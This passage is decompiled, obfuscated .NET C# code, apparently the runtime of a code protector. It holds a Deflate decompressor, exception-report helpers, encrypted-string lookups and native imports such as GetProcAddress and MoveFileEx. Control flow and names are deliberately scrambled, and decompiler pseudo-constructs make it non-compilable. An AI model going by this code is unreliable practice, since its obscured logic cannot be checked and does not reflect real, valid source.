    static bool \u0001([In] \u000F.\u0005 obj0) => obj0.\u0001;

    static unsafe void \u0001([In] \u0008.\u0002.\u0007.\u0001 obj0, [In] \u0008.\u0002.\u0007.\u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      int num1;
      try
      {
        if (true)
          goto label_26;
label_14:
        int num2 = num1;
        int num3 = num2 - 1;
label_15:
        num1 = num3;
        if (num2 > 0)
        {
          \u0007.\u0004.\u0001(obj0, *(int*) ((IntPtr) voidPtr + 8));
          goto label_14;
        }
label_24:
        while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002)
        {
label_2:
          num1 = 1;
          *(int*) ((IntPtr) voidPtr + 16) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)];
          if (false)
            goto label_5;
          else
            goto label_28;
label_4:
          if (*(int*) ((IntPtr) voidPtr + 8) == *(int*) ((IntPtr) voidPtr + 16))
            goto label_6;
label_5:
          \u0007.\u0004.\u0001(obj0, *(int*) ((IntPtr) voidPtr + 16));
          num1 = 0;
label_6:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 16);
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          int num4;
          int num5;
          do
          {
            if (true)
            {
              do
              {
                if (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002 && *(int*) ((IntPtr) voidPtr + 8) == (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)])
                {
                  *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
                  num4 = num1;
                  num5 = 1;
                  if (num5 == 0)
                    goto label_31;
                }
                else
                  break;
              }
              while ((num1 = num4 + num5) < *(int*) voidPtr);
            }
            else
              goto label_2;
          }
          while (false);
          if (num1 >= *(int*) ((IntPtr) voidPtr + 4))
          {
            if (*(int*) ((IntPtr) voidPtr + 8) != 0)
              \u0007.\u0004.\u0001(obj0, 16);
            else
              goto label_19;
label_18:
            \u0007.\u0004.\u0001(obj1.\u0001.\u0001, num1 - 3, 2);
            continue;
label_19:
            if (true)
            {
              if (true)
              {
                if (num1 <= 10)
                {
                  \u0007.\u0004.\u0001(obj0, 17);
                  \u0007.\u0004.\u0001(obj1.\u0001.\u0001, num1 - 3, 3);
                  continue;
                }
                \u0007.\u0004.\u0001(obj0, 18);
                \u0007.\u0004.\u0001(obj1.\u0001.\u0001, num1 - 11, 7);
                continue;
              }
              goto label_18;
            }
            else
              goto label_4;
          }
          else
            goto label_14;
label_31:
          num3 = num5;
          num2 = num4;
          goto label_15;
label_28:
          if (*(int*) ((IntPtr) voidPtr + 16) != 0)
          {
            *(int*) voidPtr = 6;
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            goto label_4;
          }
          else
          {
            *(int*) voidPtr = 138;
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            goto label_6;
          }
        }
        return;
label_26:
        *(int*) ((IntPtr) voidPtr + 8) = -1;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 12) = 0;
          goto label_24;
        }
        else
          goto label_14;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        \u0008.\u0002.\u0007.\u0001 obj2 = obj1;
        \u0008.\u0002.\u0007.\u0001 obj3 = obj0;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj2, (object) obj3);
        throw;
      }
    }

    static void \u0001([In] IWebProxy obj0, [In] \u0004.\u0002 obj1) => obj1.\u0001 = obj0;

    static void \u0001([In] string obj0)
    {
      IDisposable disposable1;
      string str1;
      try
      {
        if (false)
          return;
        if (true)
          goto label_8;
label_2:
        try
        {
          disposable1 = \u0007.\u0004.\u0001();
          str1 = \u0007.\u0004.\u0001(obj0);
          \u0007.\u0004.\u0001(0L, str1);
          return;
        }
        catch (Exception ex)
        {
          return;
        }
        finally
        {
          if (disposable1 != null)
            \u0011.\u007E\u0015((object) disposable1);
        }
label_8:
        disposable1 = (IDisposable) null;
        goto label_2;
      }
      catch (Exception ex)
      {
        IDisposable disposable2 = disposable1;
        string str2 = str1;
        string str3 = obj0;
        \u0007.\u0004.\u0001(ex, (object) disposable2, (object) str2, (object) str3);
        throw;
      }
    }

    static bool \u0001([In] \u000E.\u0003 obj0) => obj0.\u0002 && obj0.\u0001.\u0001();

    static string \u0001([In] \u0008.\u0005.\u0003 obj0)
    {
      string str;
      try
      {
        str = obj0.\u0003;
      }
      catch (Exception ex)
      {
        \u0008.\u0005.\u0003 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return str;
    }

    static void \u0001([In] int obj0, [In] \u0008.\u0002.\u0002 obj1, [In] byte[] obj2, [In] int obj3)
    {
      int num1;
      try
      {
        if (false)
          goto label_10;
        else
          goto label_16;
label_1:
        int num2;
        int num3;
        if (num2 < num3)
          throw new InvalidOperationException();
        int num4 = obj3;
        int num5 = obj0;
        if (true)
          num1 = num4 + num5;
        else
          goto label_8;
label_4:
        int num6;
        if (0 <= obj3)
        {
          num2 = obj3;
          num3 = num1;
          if (true)
          {
            if (num2 <= num3)
            {
              int num7 = num1;
              if (true)
              {
                num5 = obj2.Length;
                num4 = num7;
              }
              else
              {
                num6 = num7;
                goto label_11;
              }
            }
            else
              goto label_9;
          }
          else
            goto label_1;
        }
        else
          goto label_9;
label_8:
        int num8 = num5;
        if (num4 <= num8)
          goto label_10;
label_9:
        throw new ArgumentOutOfRangeException();
label_10:
        num6 = obj0 & 1;
label_11:
        if (num6 != 0)
        {
          if (true)
          {
            obj1.\u0001 |= (uint) (((int) obj2[obj3++] & (int) byte.MaxValue) << obj1.\u0003);
            obj1.\u0003 += 8;
          }
          else
            goto label_9;
        }
        obj1.\u0001 = obj2;
        obj1.\u0001 = obj3;
        if (true)
        {
          obj1.\u0002 = num1;
          return;
        }
        goto label_4;
label_16:
        int num9 = obj1.\u0001;
        num3 = obj1.\u0002;
        num2 = num9;
        goto label_1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0008.\u0002.\u0002 obj = obj1;
        byte[] numArray = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj0;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) obj, (object) numArray, (object) local2, (object) local3);
        throw;
      }
    }

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    static extern bool \u0001(string _param0, string _param1, int _param2);

    static void \u0001()
    {
      try
      {
        try
        {
          \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(3437) + (object) (\u0007.\u0004.\u0001() ? 64 : 32));
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0007.\u0004.\u0001(ex);
        throw;
      }
    }

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Auto, SetLastError = true)]
    static extern IntPtr \u0001(IntPtr _param0, [MarshalAs(UnmanagedType.LPStr)] string _param1);

    static void \u0001([In] Exception obj0, [In] \u0002.\u0003 obj1)
    {
      \u0002.\u0006 obj = new \u0002.\u0006(obj1.\u0001, \u0007.\u0004.\u0093(3466));
      try
      {
        Type type1 = \u0082.\u007E\u001F\u0002((object) obj0);
        Type type2;
        if (true)
          type2 = type1;
        obj1.\u0001(type2);
        string str1 = \u0007.\u0004.\u0093(3479);
        try
        {
          str1 = \u0015.\u007E\u009C((object) obj0);
        }
        catch
        {
        }
        \u0081.\u007E\u0019\u0002((object) obj1.\u0001, \u0007.\u0004.\u0093(3484), str1);
        string str2 = \u0015.\u007E\u009F((object) \u0015.\u007E\u009E((object) obj0));
        \u0081.\u007E\u0019\u0002((object) obj1.\u0001, \u0007.\u0004.\u0093(3497), str2);
        int num1 = \u0090\u0002.\u007E\u0005\u0004((object) str2, ' ');
        string str3 = \u0091\u0002.\u007E\u0006\u0004((object) str2, num1 + 1);
        int num2 = \u008E.\u007E\u0095\u0002((object) str3, \u0007.\u0004.\u0093(3526));
        if (num2 != -1)
          str3 = \u008F.\u007E\u0096\u0002((object) str3, 0, num2);
        \u0081.\u007E\u0019\u0002((object) obj1.\u0001, \u0007.\u0004.\u0093(3531), str3);
        obj1.\u0001(new \u000F.\u0005((object) obj0, true));
      }
      catch
      {
      }
      finally
      {
        if (obj != null)
          \u0011.\u007E\u0015((object) obj);
      }
    }

    static string \u0001([In] \u0004.\u0002.\u0003 obj0) => obj0.\u0001;

    static void \u0001([In] uint obj0)
    {
      \u0004.\u0004 obj1;
      try
      {
        obj1 = new \u0004.\u0004();
        \u0004.\u0004 obj2 = obj1;
        int num = (int) obj0;
        if (false)
          return;
        \u0007.\u0004.\u0001((\u0008.\u0007) obj2, (uint) num);
      }
      catch (Exception ex)
      {
        \u0004.\u0004 obj3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<uint> local = (ValueType) obj0;
        \u0007.\u0004.\u0001(ex, (object) obj3, (object) local);
        throw;
      }
    }

    static void \u0001()
    {
      IDisposable disposable1;
      try
      {
        do
        {
          disposable1 = \u0007.\u0004.\u0001();
          try
          {
            do
            {
              if (true)
                goto label_3;
label_2:
              continue;
label_3:
              \u0007.\u0004.\u0001();
              goto label_2;
            }
            while (false);
          }
          finally
          {
            if (disposable1 != null)
              \u0011.\u007E\u0015((object) disposable1);
          }
        }
        while (false);
      }
      catch (Exception ex)
      {
        IDisposable disposable2 = disposable1;
        \u0007.\u0004.\u0001(ex, (object) disposable2);
        throw;
      }
    }

    static unsafe string \u0001([In] object obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      try
      {
        if (obj0 == null)
          return string.Empty;
        if (!(obj0 is int num10))
        {
          switch (obj0)
          {
            case long num1:
              *(long*) voidPtr = num1;
              return ((long*) voidPtr)->ToString(\u0007.\u0004.\u0093(518));
            case short num2:
              *(short*) ((IntPtr) voidPtr + 40) = num2;
              return ((short*) ((IntPtr) voidPtr + 40))->ToString(\u0007.\u0004.\u0093(518));
            case uint num3:
              *(int*) ((IntPtr) voidPtr + 36) = (int) num3;
              return ((uint*) ((IntPtr) voidPtr + 36))->ToString(\u0007.\u0004.\u0093(518));
            case ulong num4:
              *(long*) ((IntPtr) voidPtr + 8) = (long) num4;
              return ((ulong*) ((IntPtr) voidPtr + 8))->ToString(\u0007.\u0004.\u0093(518));
            case ushort num5:
              *(short*) ((IntPtr) voidPtr + 42) = (short) num5;
              return ((ushort*) ((IntPtr) voidPtr + 42))->ToString(\u0007.\u0004.\u0093(518));
            case byte num6:
              *(sbyte*) ((IntPtr) voidPtr + 44) = (sbyte) num6;
              return ((byte*) ((IntPtr) voidPtr + 44))->ToString(\u0007.\u0004.\u0093(518));
            case sbyte num7:
              *(sbyte*) ((IntPtr) voidPtr + 45) = num7;
              return ((sbyte*) ((IntPtr) voidPtr + 45))->ToString(\u0007.\u0004.\u0093(518));
            case IntPtr num8:
              *(long*) ((IntPtr) voidPtr + 16) = num8.ToInt64();
              return ((long*) ((IntPtr) voidPtr + 16))->ToString(\u0007.\u0004.\u0093(518));
            case UIntPtr num9:
              *(long*) ((IntPtr) voidPtr + 24) = (long) num9.ToUInt64();
              return ((ulong*) ((IntPtr) voidPtr + 24))->ToString(\u0007.\u0004.\u0093(518));
          }
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 32) = num10;
          return ((int*) ((IntPtr) voidPtr + 32))->ToString(\u0007.\u0004.\u0093(518));
        }
      }
      catch
      {
      }
      return string.Empty;
    }

    static int \u0001([In] \u0008.\u0002.\u0003 obj0)
    {
      int num;
      try
      {
        num = obj0.\u0002;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0003 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    static unsafe int \u0001([In] int obj0, [In] int obj1, [In] \u0008.\u0002.\u0003 obj2, [In] byte[] obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      try
      {
        *(int*) voidPtr = obj2.\u0001;
        if (obj0 <= obj2.\u0002)
          goto label_9;
        else
          goto label_8;
label_2:
        do
        {
          *(int*) ((IntPtr) voidPtr + 4) = obj0;
          *(int*) ((IntPtr) voidPtr + 8) = obj0 - *(int*) voidPtr;
          if (*(int*) ((IntPtr) voidPtr + 8) > 0)
          {
            Array.Copy((Array) obj2.\u0001, 32768 - *(int*) ((IntPtr) voidPtr + 8), (Array) obj3, obj1, *(int*) ((IntPtr) voidPtr + 8));
            obj1 += *(int*) ((IntPtr) voidPtr + 8);
          }
          else
            goto label_5;
        }
        while (false);
        obj0 = *(int*) voidPtr;
label_5:
        Array.Copy((Array) obj2.\u0001, *(int*) voidPtr - obj0, (Array) obj3, obj1, obj0);
        obj2.\u0002 -= *(int*) ((IntPtr) voidPtr + 4);
        if (obj2.\u0002 < 0)
          throw new InvalidOperationException();
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 4);
        goto label_11;
label_8:
        obj0 = obj2.\u0002;
        goto label_2;
label_9:
        *(int*) voidPtr = obj2.\u0001 - obj2.\u0002 + obj0 & (int) short.MaxValue;
        goto label_2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        \u0008.\u0002.\u0003 obj = obj2;
        byte[] numArray = obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj0;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) obj, (object) numArray, (object) local4, (object) local5);
        throw;
      }
label_11:
      return *(int*) ((IntPtr) voidPtr + 12);
    }

    static void \u0001([In] \u0008.\u0007 obj0, [In] object obj1, [In] \u0007.\u0002 obj2)
    {
      \u0008.\u0006 obj3;
      try
      {
        do
        {
          \u0008.\u0006 obj4 = obj0.\u0001;
          if (true)
            goto label_6;
label_1:
          if (obj3 == null)
            goto label_3;
label_2:
          if (true)
            obj3(obj1, obj2);
label_3:
          if (true)
            continue;
          goto label_2;
label_6:
          obj3 = obj4;
          goto label_1;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0008.\u0006 obj5 = obj3;
        \u0008.\u0007 obj6 = obj0;
        object obj7 = obj1;
        \u0007.\u0002 obj8 = obj2;
        \u0007.\u0004.\u0001(ex, (object) obj5, (object) obj6, obj7, (object) obj8);
        throw;
      }
    }

    static string \u0001()
    {
      string str;
      try
      {
        str = global::\u000E.\u0010();
      }
      catch
      {
        str = \u0007.\u0004.\u0093(3479);
      }
      return str;
    }

    static int \u0001([In] \u0008.\u0002.\u0003 obj0)
    {
      int num1;
      try
      {
        do
        {
          int num2 = 32768;
          if (num2 != 0)
            num2 -= obj0.\u0002;
          num1 = num2;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0003 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static void \u0001([In] Exception obj0) => \u0007.\u0004.\u0001(obj0, new object[0]);

    static bool \u0001([In] \u0003.\u0007 obj0)
    {
      bool flag;
      try
      {
        int num;
        do
        {
          num = obj0.\u0001.Length;
label_1:
          if (true)
            num = num;
          else
            goto label_5;
label_3:
          if (true)
          {
            if (num != 0)
              continue;
            num = obj0.\u0001.Count == 0 ? 1 : 0;
          }
          else
            goto label_1;
label_5:
          if (true)
          {
            if (true)
              goto label_10;
            else
              goto label_12;
          }
          else
            goto label_3;
        }
        while (false);
        flag = false;
        goto label_12;
label_10:
        flag = num != 0;
      }
      catch (Exception ex)
      {
        \u0003.\u0007 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
label_12:
      return flag;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static unsafe bool \u0001([In] \u0008.\u0002.\u0005 obj0, [In] \u0008.\u0002.\u0002 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
label_1:
      int num1;
      int num2;
      byte num3;
      int num4;
      try
      {
        while (true)
        {
          num1 = obj0.\u0001;
          int num5 = num1;
          int num6;
          while (true)
          {
            int num7;
            switch (num5)
            {
              case 0:
                obj0.\u0002 = \u0007.\u0004.\u0001(obj1, 5);
                if (obj0.\u0002 >= 0)
                {
                  obj0.\u0002 += 257;
                  \u0007.\u0004.\u0001(obj1, 5);
                  obj0.\u0001 = 1;
                  goto case 1;
                }
                else
                  goto label_40;
              case 1:
                if (true)
                {
                  obj0.\u0003 = \u0007.\u0004.\u0001(obj1, 5);
                  int num8 = obj0.\u0003;
                  int num9 = 0;
                  if (num9 == 0)
                  {
                    if (num8 >= num9)
                    {
                      ++obj0.\u0003;
                      \u0007.\u0004.\u0001(obj1, 5);
                      obj0.\u0005 = obj0.\u0002 + obj0.\u0003;
                      obj0.\u0002 = new byte[obj0.\u0005];
                      obj0.\u0001 = 2;
                      goto case 2;
                    }
                    else
                      goto label_8;
                  }
                  else
                  {
                    num7 = num9;
                    num7 = num8;
                    goto label_24;
                  }
                }
                else
                  goto label_18;
              case 2:
                obj0.\u0004 = \u0007.\u0004.\u0001(obj1, 4);
                if (obj0.\u0004 >= 0)
                {
                  obj0.\u0004 += 4;
                  \u0007.\u0004.\u0001(obj1, 4);
                  if (true)
                  {
                    obj0.\u0001 = new byte[19];
                    obj0.\u0007 = 0;
                    obj0.\u0001 = 3;
                    goto case 3;
                  }
                  else
                    break;
                }
                else
                  goto label_11;
              case 3:
label_19:
                if (obj0.\u0007 < obj0.\u0004)
                {
                  *(int*) voidPtr = \u0007.\u0004.\u0001(obj1, 3);
                  if (*(int*) voidPtr >= 0)
                  {
                    \u0007.\u0004.\u0001(obj1, 3);
                    break;
                  }
                  goto label_15;
                }
                else
                {
                  obj0.\u0001 = new \u0008.\u0002.\u0004(obj0.\u0001);
                  obj0.\u0001 = (byte[]) null;
                  obj0.\u0007 = 0;
                  obj0.\u0001 = 4;
                  goto case 4;
                }
              case 4:
label_23:
                num7 = \u0007.\u0004.\u0001(obj0.\u0001, obj1);
                goto label_24;
              case 5:
label_30:
                *(int*) ((IntPtr) voidPtr + 4) = \u0008.\u0002.\u0005.\u0002[obj0.\u0006];
                num6 = \u0007.\u0004.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
                if (false)
                {
                  num5 = num6;
                  continue;
                }
                goto label_31;
              default:
                goto label_1;
            }
            obj0.\u0001[\u0008.\u0002.\u0005.\u0003[obj0.\u0007]] = (byte) *(int*) voidPtr;
label_18:
            ++obj0.\u0007;
            goto label_19;
label_24:
            num2 = num7;
            if ((num7 & -16) == 0)
            {
              byte[] numArray = obj0.\u0002;
              num1 = obj0.\u0007++;
              int index = num1;
              obj0.\u0001 = num3 = (byte) num2;
              int num10 = (int) num3;
              numArray[index] = (byte) num10;
              if (obj0.\u0007 != obj0.\u0005)
                goto label_23;
              else
                goto label_22;
            }
            else if (num2 >= 0)
            {
              if (num2 >= 17)
                obj0.\u0001 = (byte) 0;
              obj0.\u0006 = num2 - 16;
              obj0.\u0001 = 5;
              goto label_30;
            }
            else
              goto label_26;
          }
label_31:
          num4 = num6;
          if (num4 >= 0)
          {
            \u0007.\u0004.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
            num4 += \u0008.\u0002.\u0005.\u0001[obj0.\u0006];
            while (num4-- > 0)
            {
              byte[] numArray = obj0.\u0002;
              num1 = obj0.\u0007++;
              int index = num1;
              int num11 = (int) obj0.\u0001;
              numArray[index] = (byte) num11;
            }
            if (obj0.\u0007 != obj0.\u0005)
              obj0.\u0001 = 4;
            else
              goto label_37;
          }
          else
            goto label_32;
        }
label_8:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_11:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_15:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_22:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 1;
        goto label_42;
label_26:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_32:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_37:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 1;
        goto label_42;
label_40:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) num4;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<byte> local6 = (ValueType) num3;
        \u0008.\u0002.\u0005 obj2 = obj0;
        \u0008.\u0002.\u0002 obj3 = obj1;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj2, (object) obj3);
        throw;
      }
label_42:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 8);
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7,
      [In] object obj8,
      [In] object obj9,
      [In] object obj10)
    {
      \u0007.\u0004.\u0001(obj0, new object[10]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7,
        obj8,
        obj9,
        obj10
      });
    }

    static unsafe bool \u0001([In] \u0008.\u0002.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(13);
      int num;
      try
      {
        num = obj0.\u0001;
        switch (num)
        {
          case 2:
            if (obj0.\u0001)
            {
              obj0.\u0001 = 12;
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            *(int*) voidPtr = \u0007.\u0004.\u0001(obj0.\u0001, 3);
            if (*(int*) voidPtr < 0)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            \u0007.\u0004.\u0001(obj0.\u0001, 3);
            if ((*(int*) voidPtr & 1) != 0)
              obj0.\u0001 = true;
            num = *(int*) voidPtr >> 1;
            switch (num)
            {
              case 0:
                \u0007.\u0004.\u0001(obj0.\u0001);
                obj0.\u0001 = 3;
                break;
              case 1:
                obj0.\u0001 = \u0008.\u0002.\u0004.\u0001;
                obj0.\u0002 = \u0008.\u0002.\u0004.\u0002;
                obj0.\u0001 = 7;
                break;
              case 2:
                obj0.\u0001 = new \u0008.\u0002.\u0005();
                obj0.\u0001 = 6;
                break;
            }
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
            break;
          case 3:
            obj0.\u0005 = num = \u0007.\u0004.\u0001(obj0.\u0001, 16);
            if (num < 0)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            \u0007.\u0004.\u0001(obj0.\u0001, 16);
            obj0.\u0001 = 4;
            goto case 4;
          case 4:
            *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0004.\u0001(obj0.\u0001, 16);
            if (*(int*) ((IntPtr) voidPtr + 4) < 0)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            \u0007.\u0004.\u0001(obj0.\u0001, 16);
            obj0.\u0001 = 5;
            goto case 5;
          case 5:
            *(int*) ((IntPtr) voidPtr + 8) = \u0007.\u0004.\u0001(obj0.\u0001, obj0.\u0001, obj0.\u0005);
            obj0.\u0005 -= *(int*) ((IntPtr) voidPtr + 8);
            if (obj0.\u0005 == 0)
            {
              obj0.\u0001 = 2;
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
              break;
            }
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) !\u0007.\u0004.\u0001(obj0.\u0001);
            break;
          case 6:
            if (!\u0007.\u0004.\u0001(obj0.\u0001, obj0.\u0001))
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            obj0.\u0001 = \u0007.\u0004.\u0001(obj0.\u0001);
            obj0.\u0002 = \u0007.\u0004.\u0001(obj0.\u0001);
            obj0.\u0001 = 7;
            goto case 7;
          case 7:
          case 8:
          case 9:
          case 10:
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) \u0007.\u0004.\u0001(obj0);
            break;
          case 12:
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
            break;
          default:
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
            break;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) num;
        \u0008.\u0002.\u0001 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) obj);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 12);
    }

    static bool \u0001([In] \u0004.\u0002.\u0003 obj0, [In] \u0004.\u0002 obj1, [In] byte[] obj2)
    {
      byte[] numArray1;
      bool flag;
      try
      {
        numArray1 = \u0007.\u0004.\u0001(obj2);
      }
      catch (Exception ex)
      {
        \u0007.\u0004.\u0001(obj1, \u000F.\u0006.\u0001, \u0008.\u0002.\u0001);
        flag = false;
        goto label_9;
      }
      if (true)
        goto label_11;
label_6:
      \u0004.\u0003 obj3 = new \u0004.\u0003(\u0007.\u0004.\u0093(3278));
      if (obj1.\u0001 != null)
      {
        obj3.\u0001 = obj1.\u0001;
        goto label_8;
      }
      else
        goto label_8;
label_11:
      byte[] numArray2 = \u0007.\u0004.\u0001(numArray1, \u0007.\u0004.\u0093(2952));
      byte[] numArray3;
      if (true)
        numArray3 = numArray2;
      if (numArray3 != null)
      {
        \u0007.\u0004.\u0001(obj1, \u000F.\u0006.\u0002);
        goto label_6;
      }
      else
      {
        \u0007.\u0004.\u0001(obj1, \u000F.\u0006.\u0001, \u0002.\u0002.\u0001);
        int num = 0;
        return num != 0 ? num != 0 : num != 0;
      }
label_8:
      \u0004.\u0002.\u0001 obj4 = new \u0004.\u0002.\u0001(obj1, numArray3, obj3, obj0);
      \u0007.\u0004.\u0001(new \u000E.\u0004(((\u0007.\u0004) obj4).\u0001), obj3);
      return obj4.\u0001;
label_9:
      if (true)
        return flag;
      goto label_8;
    }

    static string \u0001([In] string obj0)
    {
      while (true)
      {
        int num;
        if (true)
          num = \u0016.\u007E\u0002\u0002((object) obj0, \u0007.\u0004.\u0093(3540)) ? 1 : 0;
        else
          goto label_4;
label_3:
        if (num == 0)
          break;
label_4:
        if (true)
        {
          num = \u0016.\u007E\u0001\u0002((object) obj0, \u0007.\u0004.\u0093(3561)) ? 1 : 0;
          if (true)
          {
            if (num != 0)
              return \u0007.\u0004.\u0093(3582);
            break;
          }
          goto label_3;
        }
      }
      return obj0;
    }

    static void \u0001([In] \u0002.\u0003 obj0, [In] \u0008.\u0003 obj1)
    {
      \u000E.\u0002 obj = obj0.\u0001;
      if (obj == null)
        return;
      obj((object) obj0, obj1);
    }

    static void \u0001([In] \u0008.\u0002.\u0007.\u0001 obj0, [In] int obj1)
    {
      try
      {
        do
        {
          if (true)
            goto label_3;
label_1:
          continue;
label_3:
          \u0007.\u0004.\u0001(obj0.\u0001.\u0001, (int) obj0.\u0002[obj1] & (int) ushort.MaxValue, (int) obj0.\u0001[obj1]);
          goto label_1;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0007.\u0001 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj1;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

